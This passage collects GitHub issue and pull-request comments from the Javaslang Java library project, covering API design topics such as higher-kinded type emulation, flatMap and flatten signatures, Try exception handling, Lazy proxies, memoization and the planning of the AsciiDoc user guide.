intersection-types, we need to define:\n``` java\n// Intersection of {@code Univalent} and {@code Monad}.\ninterface UnivalentMonad, T> extends Univalent, Monad;\n// and then...\nstatic  Option flatten(Option<? extends UnivalentMonad<?, T>> option);\n```\n2) For Traversable types the following makes sense:\njava\nList<Option<String>> list = List.of(new Some<>(1), None.instance());\nList<String> result = option.transform(Option.flatten()); // = List(1)\nWe can achieve this like so:\njava\nstatic <T> List<T> flatten(List<? extends Monad<?, T> > list);\nJust some thoughts...\n. No need for simulated intersection types. The above example works as follows:\njava\nstatic <M extends Monad<M, T> & Univalent<T>, T> Option<T> flatten(Option<M> it) {\n    if (it.isEmpty()) {\n        return None.instance();\n    } else {\n        return it.get().toOption();\n    }\n}\n. Depends on #254 \n. Monad removed in favor of TraversableOnce\n. The situation changed, the Monad was moved to the javaslang-pure module. I currently see no reason why we should not provide flatten() as static method. The contained type should be ? extends Iterable<? extends T> (or ? extends Iterable<T>?).\nExample:\njava\ninterface List<T> extends LinearSeq<T> {\n    static <T> List<T> flatten(List<? extends Iterable<? extends T>> list) {\n        ...\n    }\n}\n. Too complicated to maintain because not part of the type-hierarchy. We will use flatMap(t -> t) instead.\n. Note: I struggled with the idea to remove HigherKinded from Javaslang. But then it would not be possible to have flatMap() accross inherited types like so:\n``` java\ninterface Traversable> extends Iterable {\n<U> Traversable<U, M> flatMap(Function<? super T, ? extends M> mapper);\n\n}\ninterface Seq> extends Traversable, IntFunction {\n@Override\n<U> Seq<U, M> flatMap(Function<? super T, ? extends M> mapper);\n\n}\ninterface List extends Seq> {\n// does not compile, List<U> does not match the type ? extends M\n@Override\n<U> List<U> flatMap(Function<? super T, ? extends List<U>> mapper);\n\n}\n```\n1) The first solution would be to remove flatMap() in order to have mapper return the current type:\n``` java\ninterface Traversable extends Iterable {\n    // no flatMap() here\n}\ninterface Seq extends Traversable, IntFunction {\n    // no flatMap() here\n}\ninterface List extends Seq {\n<U> List<U> flatMap(Function<? super T, ? extends List<U>> mapper);\n\n}\n```\nThis is unsatisfying.\n2) The second solution would be to fixate the return type of mapper:\n``` java\ninterface Traversable extends Iterable {\n<U> Traversable<U> flatMap(Function<? super T, ? extends Traversable<U>> mapper);\n\n}\ninterface Seq extends Traversable, IntFunction {\n@Override\n<U> Seq<U> flatMap(Function<? super T, ? extends Traversable<U>> mapper);\n\n}\ninterface List extends Seq {\n@Override\n<U> List<U> flatMap(Function<? super T, ? extends Traversable<U>> mapper);\n\n}\n```\nThis solution implies, that List<T> has to extend Monad<T, Traversable<?>> instead of Monad<T, List<?>> which has implications on the monadic properties and is therefore no viable alternative.\n@jbgi Again, you are completely right, thanks for the hint/your question, why Traversable implements Monad. I will fix that.\n3) The caveats of the solution described in the issue's initial description / proposed solution are:\n- More noise: Traversable<T, M> and Seq<T, M> carry an addition generic type parameter on their way\n- The mapper result has the type ? extends HigherKinded<U, List<?>> instead of List<U>, which is odd\n. Maybe I should rename HigherKinded to Type and swap the generic parameters, i.e. Type<List<?>, U> that reads: type List with elements of type U.\nThe class Type would then move to the first-level package javaslang and it would be official API for these kind of problems in functional programming with Java.\n. > Functor should be probably extends Type/HigherKind\nWhat is the use case you have in mind? It does not have a method of the shape of flatMap, i.e. it does not need the additional type information. The less the better...\n\nBut what about using a visualy light class name like hk<> or __<> (alla highj)?\n\nYes, I've thought of that. flatMap() has this name in its type signature. I bet Java programmer Joe/Jane Average will be totally lost, if he/she reads:\n``` java\ninterface List / super interfaces omitted / {\n    @Override\n    <U> List<U> flatMap(Function<? super T, ? extends __<List<?>, U>> mapper);\n\n}\n```\nThe name Type gives a hint about the semantics.\n. @jbgi oh wait __<List<?>, U> isn't that bad :-) because we see only the relevant part: List of type U.\nIndeed, this is very cool!\n. @jbgi Why do you write two underscores __ instead of one _? Does it reflect the number of generic type arguments?\n. ah, ok. I've read about \"completing underscore removal from legal identifier names\" in Java 9. Does this affect also class names? I don't know...\n. As of Java 9 / JEP 213 Milling Project Coin: \"In addition, using underscore (\"_\") as an identifier, which generates a warning as of Java SE 8, should be turned into an error in Java SE 9.\"\nHaving in mind that two underscores produce no javac warning, I interpret this as two underscores are permitted as identifier with Java 9 onwards.\n. @jbgi We could be really evil and using unicode character non-breaking space \u00a0 \"\\u00A0\" as interface name. I like that. This would automatically internalize the higher-kinded type because no one can type it :-)\n(This is no joke!)\n. lame - javac does not allow \"\\u00A0\" as interface name. perhaps there are other unicode chars, I'm searching...\n. in particular \\u200B is interesting ('zero width space')\n. also does not work - ok, I will read the Java language spec...\n. Here is a list of all valid Java 8 identifier start characters between unicode 0 and 9999 (dec): http://danieldietrich.net/playground/ValidJava8IdentifierStart.html\n. After fiddling around with unicode a while I give up. I will take the two underscores approach for HigherKinded and swap Type args as suggested above.\n. Mmhhh... any suggestions?\n. I think we have to work with the information we have - we do it with two underscores. (It will take years for Oracle to change that standard.)\n. We want to formulate that List<T> is of type <List<?>, T>.\nFor now I will stick with List<T> is of type __<List<?>, T> because it is nearest to that without introducing additional information like non-punctuation characters.\nI think, higher-kinded __ has to move to the first-level package javaslang. It has nothing to do with javaslang.algebra, instead it is used for API design.\n. __ is not the right way to do it. I tweetet with Brian Goetz himself and he clarified not to use such identifiers. I'm thankful for the push in the right direction.\nHK is no viable alternative, it also says nothing to someone who does not know the context. We need something short and explanatory. HigherKinded is too long. We describe a Type but Type is taken by reflection.\nFrom wikipedia:\n\n\"(...) a kind is the type of a type constructor or, less commonly, the type of a higher-order type operator\".\n\nSo let's take Kind.\n. Thank you very much for your contribution! Please see my comments in 'Files changed' and amend the pull request.\n. LGTM, thanks!\nI can't merge your changes automatically. Can you merge origin/master please? Here is how:\nshell\ngit remote -v\ngit remote add upstream https://github.com/javaslang/javaslang.git\ngit remote -v\ngit fetch upstream\ngit checkout master\ngit merge upstream/master\nThen resolve conflicts, if any, and git commit -a -m \"merged origin/master\" and push as usual.\nNote: Alternatively I can merge your changes manually but then this Pull Request gets lost. I want to honor your changes!\n. Great! Many thanks!!\n. Tested a bit in that direction and saw that map() is sufficient.\n. LGTM\n. It was a no-brainer, felt a little bit like making a break :-) So I've done it.\n. This goes in the right direction. narrow() is tightly coupled with Kind:\n``` java\npublic interface Kind, T> {\n/**\n * Performs a downcast, also known as <em>narrowing conversions</em>.\n * The resulting type approximately has the shape {@code TYPE<T>}.\n *\n * @return this instance casted to the type described by this kind.\n */\nObject narrow();\n\n}\n```\nThen we have:\n``` java\ninterface Monad, T> extends Kind {\n@Override\ndefault Monad<M, T> narrow() {\n    return this;\n}\n\n}\ninterface Option extends Kind, T>, Monad, T> {\n@Override\ndefault Option<T> narrow() {\n    return this;\n}\n\n}\n```\nClean version, no cast needed any more! In Kind the best we can say about the return type of narrow is, that it is an Object, but the interface is a contract, which defines the semantics. Should be ok!\n. I see, it should have been something like\n``` java\ninterface Kind, T> {\nTYPE<T> narrow();\n\n}\n```\nwhich isn't possible.\nWould you mind to add the missing methods as Pull Request? I'm currently overloaded with the amount of incoming open tasks...\n. @jbgi Btw - your method signatures look good!\njava\nstatic <M extends Monad<M, ?>, T> Monad<M, T> narrow(Kind<M, T> option) {\n    return (Monad<M, T>) option;\n}\nstatic <T> Option<T> narrow(Kind<Option<?>, T> option) {\n    return (Option<T>) option;\n}\nI'm on a similar task with static flatten() methods...\n. @jbgi I still don't understand why a direct type cast isn't sufficient instead of statically call a narrow() method, which does the same. Have you a code snippet for clarification?\nIf possible, I don't want to make the narrow() API puplic. It is internally used, only, isn't it?\n. @jbgi This sounds exciting! Take your time to get it right, there is no hurry. I will be also on a short trip next weekend. Please try to cover the code with tests. This has saved me headaches in the past when it came to refactoring.\nHave a great week!\n. Given\njava\npublic interface Kind<TYPE extends Kind<TYPE, ?>, T> {\n}\nhow would we define a Functor interface, which also works for Map?\n``` java\nimport java.util.function.Function;\npublic interface Functor, A> {\n<B> Kind<F, B> map(Function<? super A, ? extends B> f);\n\nstatic <A> Functor<List<?>, A> lift(List<A> list) {\n    return list::map;\n}\n\nstatic <K, V> Functor<Map<?, ?>, Map.Entry<K, V>> lift(Map<K, V> map) {\n    // DOES NOT WORK, BECAUSE Map.map RETURNS A Seq\n    return map::map;\n}\n\n}\n// placeholders, just examples\ninterface Traversable {\n     Traversable map(Function<? super T, ? extends U> mapper);\n}\ninterface List extends Kind, T>, Traversable {\n    @Override\n     List map(Function<? super T, ? extends U> mapper);\n}\ninterface Map extends Kind, Map.Entry>, Traversable {\n@Override\n<U> Seq<U> map(Function<? super Entry<K, V>, ? extends U> mapper);\n\n// cannot be used for Functor\n<U, W> Map<U, W> map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n\ninterface Entry<K, V> {}\n\n}\ninterface Seq extends Kind, T>, Traversable {\n    @Override\n     Seq map(Function<? super T, ? extends U> mapper);\n}\n```\n/cc @jbgi \n. Yes, great - wonder how Scalaz's Functor works for Map, need to check that.\nHowever, here it will look like:\n``` java\npublic interface Functor, A> {\n<B> Kind<F, B> map(Function<? super A, ? extends B> f);\n\n// intentionally not Map<? extends K, ? extends V> because K is fixed\nstatic <K, V> Functor<Map<K, ?>, V> lift(Map<K, ? extends V> map) {\n    return f -> map.iterator().map(entry -> entry.map(k -> k, f)).toMap(Map.Entry::toTuple);\n}\n\n}\ninterface Map extends Kind,V>, Traversable> {\n@Override\n<U> Seq<U> map(Function<? super Entry<K, V>, ? extends U> mapper);\n\n// cannot be used for Functor\n<U, W> Map<U, W> map(BiFunction<? super K, ? super V, ? extends Entry<? extends U, ? extends W>> mapper);\n\nIterator<Entry<K, V>> iterator();\n\ninterface Entry<K, V> {\n\n    <X, Y> Entry<X, Y> flatMap(BiFunction<? super K, ? super V, ? extends Entry<? extends X, ? extends Y>> mapper);\n\n    <X, Y> Entry<X, Y> map(BiFunction<? super K, ? super V, ? extends Entry<? extends X, ? extends Y>> mapper);\n\n    <X, Y> Entry<X, Y> map(Function<? super K, ? extends X> keyMapper, Function<? super V, ? extends Y> valueMapper);\n\n    Tuple2<K, V> toTuple();\n}\n\n}\n```\n. Meanwhile...\nJavaslang moved in a different direction. Kind isn't used any more. And Monad was re-added as semi-Monad, flatMap takes a function that returns Iterable.\nNeartime we will add Validation and with it Applicative. It is different than in Scalaz (or Cats), we have no Apply for example.\nI think the monadic layer above Javaslang, as I suggested, is obsolete now. And going adhere with it probably also this issue. I will close it if you agree.\n/cc @jbgi \n. Makes sense!\n. I thought a little bit about it and also read Abstract Classes Compared to Interfaces, in particular the bullet-list there.\nInstead of interfaces or abstracted classes I would prefer to use classes for List and Stream. We could remove List.AbstractList, Stream.AbstractStream etc. when we make List and Stream classes. They are currently there because interfaces are not able to override Object.toString(), equals() and hashCode.\nIt is right that it is suspicious, when an interface internally relies on specific implementations, like interface List relying on class Nil. An interface should be a contract, being implemented by unrelated classes.\nSecurity: Via reflection we are still able to call private constructors of classes. In general we should embrace the open/closed principle. Looking at BinaryTree the API is not finished, yet. I have a local branch and am fiddling around with Tree, Set and Map. The API emerges, it will take a while (I target July). I'm not sure how to design the whole tree hierarchy. There are balanced and unbalanced binary trees. The balanced ones are AVL and RedBlack for example, which are, beside Trie, candidates for the internal Map and Set implementation.\nYour ideas are very valuable. I will keep track of it.\n. There is a relation between Scala's (trait, companion object) and Java's (interface, static interface methods). Static interface methods are most common factory methods.\nJava interfaces are used as real mixins with default methods.\nI'm clear now that this design principle, as used all over in Javaslang, makes absolutely sense, and will be the base for the emerging collection API (and also orher parts of Javaslang).\nI have great examples in mind and think, my next blog post will cover this in depth to understand Javaslang collections and API design with Java 8.\n. I'm sure there are also disadvantages when using classes. There are many disign possibilities with Java 8 interfaces.\nExample:\nList is an interface with implementations Cons and Nil. It is eager and has single linked list characteristics but could also be double linked. In a future release there (maybe) will be a sub-interface ArrayList of List with random-access cababilities. It will have also static factory methods, like List, this makes them implementation-independend (which is a feature).\nI keep this issue open but let us concentrate first on issues with business value and not start too much technical re-design:\n\n. I understand the thoughts of @jbgi but I think it is not sufficient to have classes. The same problem arise when converting all interfaces (Option, Either, List, Stream, ...) to classes as long as the classes are not final. They cannot be final because  there are implementations (Some/None, Left/Right, Cons/Nil, Cons/Empty, ...).\nWhat we need is something like the sealed keyword in Scala to ensure that only specific classes are allowed to implement an interface. But unfortunately Java does not have it yet.\nI will close this ticket for now as #wontfix\n. Thank you!\n. Nice finding, thank you! Also for investigating it in depth!\n. One more word on the interface design mentioned above (here slightly simplified):\n``` java\ninterface Tree extends Traversable {\n    boolean isEmpty();\n    boolean isBranch();\n    boolean isLeaf();\n    Seq> getChildren();\n    // ...\n    static  Nil nil() { ... }\n    static  Branch of(T value, Seq> children) { ... }\n    // ...\n    class Nil extends Tree { ... }\n    class Branch extends Tree { ... }\n}\ninterface BinaryTree extends Tree {\n    BinaryTree left();\n    BinaryTree right();\n    @Override Seq> getChildren();\n    // ...\n    static  Nil nil() { ... }\n    static  Branch of(BinaryTree left, T value, BinaryTree right) { ... }\n    // ...\n    class Nil extends BinaryTree { ... }\n    class Branch extends BinaryTree { ... }\n}\ninterface RedBlackTree extends BinaryTree {\n    Color getColor();\n    @Override RedBlackTree left();\n    @Override RedBlackTree right();\n    @Override Seq> getChildren();\n    // ...\n    static  Nil nil() { ... }\n    static  Branch of(RedBlackTree left, T value, RedBlackTree right) { ... }\n    // ...\n    class Nil extends RedBlackTree { ... }\n    class Branch extends RedBlackTree { ... }\n    enum Color { RED, BLACK }\n}\n```\nPlease note, that currently no back-reference to root nodes is modeled.\nPlease note also, that children are of type Seq, this implies that it is possible to model trees of infinite size (by using Stream instead of List).\n. More on implementing Traversable here: #113 \n. See also https://github.com/javaslang/javaslang/issues/220#issuecomment-128503697\n. Already fixed.\n. @jorander Wow! Thanks.\nYou may move the package, e.g. to javaslang.euler. This would be great.\nThe memoization idea is very cool! I will add it to the (Checked)Function Generator:\n``` java\nstatic  Function1 memoize(Function1 f) {\n    final Map cache = new ConcurrentHashMap<>();\n    return input -> cache.computeIfAbsent(input, f::apply);\n}\nstatic  Function2 memoize(Function2 f) {\n    final Map, R> cache = new ConcurrentHashMap<>();\n    return (t1, t2) -> cache.computeIfAbsent(Tuple.of(t1, t2), f.tupled()::apply);\n}\n// ...\n``\n. @jorander memoize is now part of (Checked)Functions!\n. Functions now have a new memoized() method and updated the Euler test. For better integration now Function1 extends java.util.function.Function.\n. Thanks for the hint, jb!\n. @jbgi I double-checked the source of ConcurrentHashMap. The concurrency level is used for calculating the initial capacity only. The constantDEFAULT_CONCURRENCY_LEVEL` is\n\nUnused but defined for compatibility with previous versions of this class.\n\nUsing the default constructor should be fine.\n. I've learned about the old - didn't know that.\n. Seems all ok. Unit tests run fine.\n. Nice! Great to sea how you changed the generator template. I was a little bit in 'fear' that the generator might be confusing to committers.\nI'm also impressed about the prime number solution! My solution produced a stack overflow. I have to update the twitter background of @_Javaslang with your solution :-)\n. Phew - many comments :-) I'm thrilled to test the solution but I'm waiting with the merge. I don't want to make changes myself (see comment), it is your solution!\n. Awesome, I love it!\n. - isEmpty is in place\n- isDefined does fit for javaslang.control types but not for collection. it is omitted here.\n- peek is special in its return type compared to other TraversableOnce methods. It will fit better in FilterMonadic.\n. This can be accomplished only by runtime bytecode generation, e.g. with bytebuddy. But this will not happen. No dependencies is one of the fundamental rules of Javaslang, it prevents uncontrolled growth.\nTherefore we should provide s.th. like (informally):\n``` java\nU lazyValue = Lazy.of(Supplier).proxied(U.class);\n// throws, if type is not an interface\n U proxied(Class type);\n``\n. We still need a method to check if a Lazy was evaluated, e.g. for the String representation of Stream :Stream(1, 2, ?)`.\nTherefore we will add a method Lazy.isEvaluated().\n. This is not possible:\njava\n<U super T> U proxied(Class<U> type);\nBut this:\njava\nstatic <U, T extends U> U proxied(Lazy<T> lazy, Class<U> type);\nIs there a way to get rid of the static resp. passing the lazy object?\n. The best I can come up with so far is providing another factory method:\njava\npublic static <T> T of(Supplier<? extends T> supplier, Class<T> type) {\n    Objects.requireNonNull(supplier, \"supplier is null\");\n    Objects.requireNonNull(type, \"type is null\");\n    if (!type.isInterface()) {\n        throw new IllegalArgumentException(\"type has to be an interface\");\n    }\n    final Lazy<T> lazy = Lazy.of(supplier);\n    return (T) Proxy.newProxyInstance(type.getClassLoader(), new Class<?>[] { type },\n            (proxy, method, args) -> method.invoke(lazy.get(), args));\n}\nA lazy value T behaves slightly different than a Lazy<T> instance.\njava\nLazy.of(() -> \"Yay!\").toString(); // = Lazy(?)\nLazy.of(() -> \"Yay!\", CharSequence.class).toString(); // = \"Yay!\"\nAnalogous equals of Lazy checks, if that instance is of type Lazy.\nCompared to Scala:\n``` java\nscala> lazy val s = \"Yay!\"\ns: String = \nscala> println(s)\nYay!\n```\n. Hi,\nthank you for the question!\nFor example, a StackOverflowError is considered as recoverable (see here).\nIt is interesting, that Scala considered StackOverflowError in 2.10.x as non-fatal (see here) and in 2.11.x as fatal (see here).\nHowever, in general it would be too restrictive only considering Exception as non-fatal. 3rd party frameworks may invent their own exceptions extending Throwable or may even throw Errors as recoverable exceptions (which is not recommended - but they do!).\nI think, this is the best way to go but I'm always open for new ideas!!\nGreets,\nDaniel\n. @martin-g \n\nIf other libraries abuse the meaning of Error then it's their own problem.\n\nYes, right. This is a violation of the contract of the Error class.\n\nI'd let the application decide whether to try to recover from Error/CustomThrowable.\n\nThis aligns well with the suggestion of @jbgi:\n\nSo how about making a type parameter of the particular subtype of throwable the function may throw?\n\nWhen composing multiple Try's, e.g. via flatMap, it is not possible for Java to calculate correct type bounds for the exception. This is especially the case because Throwable etc. are no interfaces (otherwise we could have used intersection types X1 & X2).\n@jbgi: There are two problem with using a type parameter for the exception (see capitalized comments). Any ideas?\n``` java\n@FunctionalInterface\ninterface CheckedSupplier {\n    R get() throws X;\n}\n@FunctionalInterface\ninterface CheckedRunnable {\n    void run() throws X;\n}\npublic interface Try {\nstatic <T, X extends Throwable> Try<T, X> of(CheckedSupplier<T, X> supplier) {\n    try {\n        return new Success<>(supplier.get());\n    } catch (X t) { // <===== CANNOT CATCH TYPE PARAMETERS\n        return new Failure<>(t);\n    }\n}\n\n// INTERSECTION TYPE DOES NOT WORK =======v\ndefault <Y extends Exception> Try<Void, X & Y> andThen(CheckedRunnable<Y> runnable) {\n    return flatMap(ignored -> Try.run(runnable));\n}\n\n}\n```\nSo, @RobWin, you made a good point with your question!\n. I've slept one night over it and already had thoughts on it a year ago.\nI think, we can't add a specific exceptions type because\n- the type gets lost when chaining effects, e.g. myTry.flatMap(e -> Try.of(() -> ...)). myTry may be of AException. If the inner Try.of throws a BException we have two cases:\n  1. myTry is a Success, then the whole result is a Failure of BException\n  2. myTry is a Failure, then the whole result is a Failure of AException\nTo express this, we need union types AExpression | BExpression\n- An Error may be non-fatal. For example it is common practice for servers to log such exceptions, i.e. Try.of(() -> ...).onFailure(x -> LOG.ERROR(\"oh noes!\", x)).map(e -> ...).get()\n- There may be a HairyException extends Throwable\nA good practice would be to match the exception, as shown in the docs at http://javaslang.com:\njava\nfinal A result = Try.of(this::bunchOfWork)\n    .recover(x -> Match\n        .caze((Exception_1 e) -> ...)\n        .caze((Exception_2 e) -> ...)\n        .caze((Exception_n e) -> ...)\n        .apply(x))\n    .orElse(other);\nTherefore I think, we will stay with Throwable.\n. @jbgi do you agree?\n. @jbgi Thanks, that helped!\n\nI think CheckFunction could be parametrized without Try taking advantage of it\n\nI will take a look at it...\n\nalso to address the original comment, maybe there could an alternate Try.of method that catch only non fatal exceptions\n\nThis is already the default behavior. But looking at the code I think it can be optimized, e.g. throwing the original Error instead of the Fatal wrapper, if the exception if fatal.\n``` java\npublic interface Try {\n    static  Try of(CheckedSupplier supplier) {\n        try {\n            return new Success<>(supplier.get());\n        } catch (Throwable t) {\n            return new Failure<>(t);\n        }\n    }\n}\npublic class Failure implements Try {\n    public Failure(Throwable t) {\n        Objects.requireNonNull(t, \"Throwable is null\");\n        final Cause cause = Cause.of(t);\n        if (cause.isFatal()) {\n            throw cause;\n        } else {\n            this.cause = (NonFatal) cause;\n        }\n    }\n}\npublic static abstract class Cause extends RuntimeException {\n    public static Cause of(Throwable t) {\n        Objects.requireNonNull(t, \"Throwable is null\");\n        if (t instanceof Cause) {\n            return (Cause) t;\n        }\n        final boolean isFatal = (t instanceof VirtualMachineError && !(t instanceof StackOverflowError))\n                || t instanceof ThreadDeath\n                || t instanceof InterruptedException\n                || t instanceof LinkageError;\n        return isFatal ? new Fatal(t) : new NonFatal(t);\n    }\n}\n```\n. Already added the badge to the readme.\n. Are there any win7/x64 users here which are able to compile the Javaslang Github repo on their machine via maven? Need some feedback - Thx!\n. I could reproduce this using VirtualBox with Win7/x64, Java 1.8.0_45, git-bash and maven 3.3.3.\nSetting the scalac file encoding in the pom.xml did not help:\nshell\n<args>\n    <arg>-encoding</arg>\n    <arg>UTF8</arg>arg>\n</args>\nThis needs to be further investigated.\n. Hi @ignasi35,\nthanks for the tests!\nYes, these are the candidates. I think the so called 'script mode' of the scala-maven-plugin accidently messes up the encoding when creating a copy of Generator.scala in the /target dir of the project.\nI will contact a scala-maven-plugin dev...\nGreets!\n. I filed a bug davidB/scala-maven-plugin#168\n. Should be fixed with scala-maven-plugin 3.2.1 but does not seem to. Tested it under Win, the error still remains. Have to further investigate it...\n. Fiddeling around a day with type collections type hierarchy, especially with List and Stack brought me the insight that the collection type hierarchy has to be treated specially to circumvent Java type system insufficiencies.\nHere is an example: Many methods in Seq are of the shape Wrapper<? extends Seq<T>> xxx(...). Of course we want List have Wrapper<List<T>> xxx(...) and Stream have Wrapper<Stream<T>> xxx(...). This is possible but the type hierarchy ends here. We know that it is not possible to extends List or Stream, say with SpecialList, which has a Wrapper<SpecialList<T>> xxx(...). To make this possible, List would have to have a Wrapper<? extends List<T>> xxx(...), which is cumbersome.\nThis leads to the design decision that we keep the collection hierarchy as flat as possible. But it is not always possible to have 1 implementation layer, looking at Sets, Maps or Trees.\nI will play around a little bit with some techniques modeling the collection type hierarchy. One idea is to have interfaces, e.g. Traversable, Seq, Set, Map, Tree, ... and make concrete implementations abstract classes (which have final inner classes Cons and Nil w.l.o.g.).\nIn the first comment we see, that Stack decorates List. It is not a good practice to wrap List, we saw this in Scala, where Stack was deprecated since 2.11. But I like to have a Stack interface. Therefore we here have:\njava\nSeq <-- Stack <-- List\nI.e. List is a Stack. That means we have the nice stack API there is no performance loss because we do not wrap List to implement a Stack.\n. I like the Scala syntax:\n- https://www.cs.helsinki.fi/u/wikla/OTS/Sisalto/examples/html/ch17.html\n- Queue.scala\n. We need a user guide. What are our business and technical requirements?\n- which input format, e.g. markdown, ...\n- which output format(s) (pdf, html, ...)?\n- infrastructure, e.g. how to maintain/deploy?\nAdditionally we need a draft of an outline.\n. +1 for AsciiDoctor\n@RobWin @jasoet-gdp I also thought about using Markdown because of simplicity. But asciidoc seems to be the right tool here. It is also simple but more powerful. It is a standardized way to produce documentation targeting different formats (print, web, ...). Let's take it! Compared to readme.io I prefer asciidoc because we have no vendor dependency and we are free to build our own build and deployment chain with the tools of our choice.\n@lukaseder it may be tempting to use XML + XSLT. I've done it years ago with apache fop :-) My resum\u00e9: simple things are possible - complex things are masochistic ;-)\n. @jasoet-gdp I will write an outline this evening (GMT+1 here)\n. @RobWin The Griffon Guide looks awesome!\n. Maybe I'm a little out-dated here. I used fop 9-10(?) years ago. I'm sure that it emerged in the mean-time.\nI prefer non-xml formats for readability reasons (less noise).\n. @robwin there needs to be a business case for lukas. The consumer of the documentation will see no difference I guess. However, a xslt from xml to asciidoc should be seemlessly possible :-)\n/cc @lukaseder \n. Great!\n. Note:\nWe should target all of these output formats: HTML, PDF and EPUB.\nAlso the documentation should be integrated on the website. Maybe we will open a new tab for now because the website is a single page.\n. ~~We will remove slice(beginIndex) since it has exactly the same semantics as drop(count) (even if slice() takes an index and drop() take a count).~~\n~~However, subSequence(beginIndex) is still needed because it throws on invalid index.~~\nWrong ticket :-) Text went here to: #597 \n. :+1:\n. The User Guide should give an overview over the Javaslang 2.x functionality. Here is a draft/first shot of the outline:\nLines starting with - give hints about the corresponding methods/functions, e.g. - memoized.\nTuples\nFunctions and Lambdas\n  Unchecked vs. Checked Functions\n  Function Memoization\n    - memoized\n  Curried Functions\n    - curried\n  Function Composition\n    - andThen\n    - compose\n  Lifting Functions\n  Lambda Type Reflection\n    - getType\n    Method References\nInterface Iterable\n  Equality\n    - equals\n    - eq\n    - corresponds\nValues\n  Capturing State and Monadic Operations\n    - get\n    - isEmpty\n    - map\n    - flatMap\n    - filter\n  Conversion Operations\n    - toXxx\n  Side Effects\n    - forEach\n    - peek\n    - out\n    - stdout\n    - stderr\nLazy Evaluation\nControls\n  Option: Null Safety\n  Try: Failure Handling\n  Either: Disjoint Union\n  Pattern Matching\nCollections\n  Interface TraversableOnce\n  Interface Traversable\n  Sequences\n    Indexed Sequences\n    Linear Sequences\n  Sets\n  Maps\n  Concrete Immutable Collection Classes\n  Arrays\n  Character Sequences\n  Iterators\n  Conversions Between Java and Javaslang\n    - ofAll\n    - toXxx (see Value)\n  Performance Characteristics\nConcurrency\n  Future\n  Promise\nProperty Checking\n  Generators\n  Arbitrary Objects\n  Properties\n  Check Results and Assertions\n. We should add an additional first-level section Idioms, which provides deep insight into the design of Javaslang.\nUpdate: This should be the first section, right in front of Tuples, because it gives a first overview over Javaslang.\nIdiom: Static Factory Methods\nJavaslang's collection interfaces like Seq, IndexedSeq, ..., Set, ... are similar to Scala's. But there is one important difference: Javaslang does not provide static factory methods for inner interfaces (read: non-terminal types) like Seq. Exception: List, but this is not really an exception, because List is composed of Nil and Cons, so we need factory methods in the List interface.\nExample:\n``` java\n// Scala: Seq[Int] = List(1, 2, 3)\nval seq = Seq(1, 2, 3)\n// Javaslang: Seq = List(1, 2, 3)\nfinal Seq seq = List.of(1, 2, 3)\n```\nWhat we see is, that Scala provides a default implementation for Seq, which is List. In Javaslang, we keep the (Java) code clean of any kind of implicit defaults, conventions over configuration magic etc. Everything is explicit, the user has to choose the behavior. This makes the code readable and predictable and we are able to reason about it.\nUpdate: There is always an exception. Stack is an interfaces, extended only by List. Scala removed Stack, we keep it to define a clear interface for Stack operations.\n. @jasoet-gdp @RobWin in a first step we should setup asciidoc within our project. E.g. by adding it to the pom.xml. The resources should not be included in a 'normal' build/jar. It is ok, if we build it locally 'by hand' in a first step, i.e. it is not necessarily needed to be built automatically with a travis-ci build for now.\nQuestion: Are there any best practices for the (maven) folder/project structure, e.g.\n- src/main/asciidoc\n- doc/...\n- src-doc/...\nIf we have the build up and running, the second step is to create the outline (without content). It would be cool to see html, pdf and epub at this stage :-)\n. Thx! Javaslang is currently a GitHub account. I hesitated to convert it to an Organization because there is no way back and I don't know the benefits. Can you explain?\n. @jasoet-gdp @RobWin this all sounds really exiting. The only stopper of progress can be only 'fear' - as always in life... My fear is to loose control, e.g. about growth. Let me sleep one night about that and I will create an organization :-)\n. @jasoet-gdp @RobWin Done. Javaslang is now an organization. Feels good :-)\n. Wooaah - this turns out to be complicated. Whom to invite to the organization an whom not??\n. @jasoet-gdp @RobWin I've created a new repo javaslang-docs. You will get write permissions there when joining the organization.\n. Ok. What is your suggestion regarding whom to invite to take part of the open source organization? How do other ~~companies~~ organizations it?\n. I like to have a team of committers - active or not.\n. PR's are important. They need to be mentioned in the CONTRIBUTION file (which needs a rewrite). I like the Typelevel Scala CONTRIBUTION.md.\n. Documentation has now its own home (and issues). We close this ticket. Next we will create an outline. \nSee javaslang/javaslang-docs#7\n. Thank you, J\u00f6rgen! It is great to see the Euler tests evolving!\nI will provide comments in a minute...\n. Many thanks!!\n. Check if peek() fits in here, too.\n. What do you think of having a Monad / FilterMonadic interface with methods (in conjunction with the Kind for semi-higher order kinds):\n- flatMapM\n- flattenM\nHave these methods a different meaning, too, in other languages?\nI can't use the original names flatMap and flatten because they have a different, relaxed signature (with Iterable instead of Monad/FilterMonadic for Traversables).\nE.g. Play Framework's Iteratee has a flatMapM.\n. Nice, thanks!\n. Yay! One step further towards 99 :-)\n. I'm now clear regarding the question which of these should be implemented:\n1. Try.retry(3, supplier).get()\n2. Try.of(supplier).retry(3).get()\n3. Try.of(Retry.of(3, suppllier)).get()\n4. Try.of(retry(3, supplier)).get(), with CheckedSupplier.retry(3, supplier)\nThe first and second solutions 'pollute' the purity of the Try monad. It is not the composable way.\nThe third solution is a viable alternative. But there is no need for an additional Type Retry. The type encapsulates no knowledge, which can be used via public API. It just has a constructor/factory method Retry.of.\nThis leads to the fourth solution, providing a factory method on the CheckedSupplier/CheckedRunnable, which delivers specific instances. There it is, where it belongs to.\n. @RobWin yes, that's right! This is a great way to do it!\n. @szarnekow You are right. This is a signal that Javaslang should offer core functionality and additions should be built on top of it. Yesterday I wrote:\n\nAlthough these additions, especially Retry, are very sweet, I think that Javaslang should be kept as a thin core. Applications, and maybe other libs, should be built on top. Also I tend to keep async collections out of Javaslang. An additional module would make more sense. Scala for example made the 'mistake' to integrate Xml natively into the language. Now they regret it. The key to maintainability is simplicity.\n\nThe question is, does it help to include a retry (which fails by default with the last exception)?\nMaybe we should make it configurable (return first/last/all exception(s)). But my impression is that we blow up the API. However, we may not meet all cases...\nUpdate: less is more and more is less\n. Retry functionality is domain specific and will not be implemented by Javaslang (core).\n. @RobWin I have mixed feelings to retry unchecked functions because the do not fail by contract. However, I see the need and would use a Retry type with factory methods for checked and unchecked versions.\n. @RobWin Maybe the decorate methods have to have different names because of ambiguities but I'm not sure (I had similar problems with Try.of and Try.run).\nFor now, I don't want to create additional Javaslang modules except a purely functional core (baking purity directly into the Javaslang core is not a good idea. It is a higher kind of functional abstraction).\nMaybe there will be an additional async/reactive streaming module (and circuit breaking would then fit in there) but that is currently out of focus.\nMy future plan for Javaslang is to reduce it instead of growing it. It should not be a collection of modules, like the all-mighty spring framework. My 